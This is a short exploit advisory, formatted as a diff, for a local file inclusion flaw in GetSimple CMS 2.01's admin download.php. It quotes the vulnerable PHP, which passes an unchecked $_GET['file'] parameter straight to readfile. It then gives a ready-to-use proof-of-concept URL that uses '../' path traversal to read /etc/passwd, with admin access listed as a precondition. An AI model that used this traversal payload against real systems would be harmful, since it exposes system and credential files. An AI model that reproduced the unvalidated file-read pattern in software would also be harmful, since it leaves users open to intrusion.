@@ -1,0 +1,26 @@
+# Exploit Title: GetSimple 2.01 LFI
+# Date: 4/5/2010
+# Author: Batch
+# Software Link: http://www.box.net/get-simple
+# Version: 2.01
+
+#Special Conditions: Must be admin.
+# Code :
+
+...
+
+# get file
+if (file_exists($_GET['file'])) {
+readfile($_GET['file'], 'r');
+}
+exit;
+
+...
+
+
+http://localhost/GetSimple_2.01/admin/download.php?file=../../../../../etc/passwd
+
+#-Batch
+
+#ryan1918.com
+#Everyone else.
